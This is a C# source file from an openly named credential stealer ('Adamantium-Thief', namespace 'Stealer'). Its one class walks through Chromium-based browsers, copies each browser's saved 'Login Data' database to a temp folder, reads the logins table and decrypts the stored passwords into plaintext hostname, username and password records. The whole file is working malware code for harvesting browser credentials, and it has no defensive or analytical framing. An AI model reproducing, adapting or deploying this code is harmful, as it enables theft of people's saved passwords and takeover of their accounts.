/* 
    Author : LimerBoy
    Github : github.com/LimerBoy/Adamantium-Thief
*/

using System;
using System.IO;
using System.Collections.Generic;
using static Stealer.Common;

namespace Stealer
{
    internal class Passwords
    {
        public static List<Password> Get()
        {
            string SqliteFile = "Login Data";
            List<Password> Passwords = new List<Password>();
            // Database
            string tempDatabaseLocation = "";

            // Search all browsers
            foreach (string browser in Paths.chromiumBasedBrowsers)
            {
                string Browser = Paths.GetUserData(browser) + SqliteFile;
                if (File.Exists(Browser))
                {
                    tempDatabaseLocation = Environment.GetEnvironmentVariable("temp") + "\\browserPasswords";
                    if (File.Exists(tempDatabaseLocation))
                    {
                        File.Delete(tempDatabaseLocation);
                    }
                    File.Copy(Browser, tempDatabaseLocation);
                } else {
                    continue;
                }

                // Read chrome database
                SQLite sSQLite = new SQLite(tempDatabaseLocation);
                sSQLite.ReadTable("logins");

                for (int i = 0; i < sSQLite.GetRowCount(); i++)
                {
                    // Get data from database
                    string hostname = sSQLite.GetValue(i, 0);
                    string username = sSQLite.GetValue(i, 3);
                    string password = sSQLite.GetValue(i, 5);

                    // If no data => break
                    if (string.IsNullOrEmpty(password))
                    {
                        break;
                    }

                    Password credentials = new Password();
                    credentials.hostname = hostname;
                    credentials.username = Crypt.GetUTF8(username);
                    credentials.password = Crypt.GetUTF8(Crypt.decryptChrome(password, Browser));

                    Passwords.Add(credentials);
                    continue;
                }
                continue;
            }
            return Passwords;
        }
    }
}
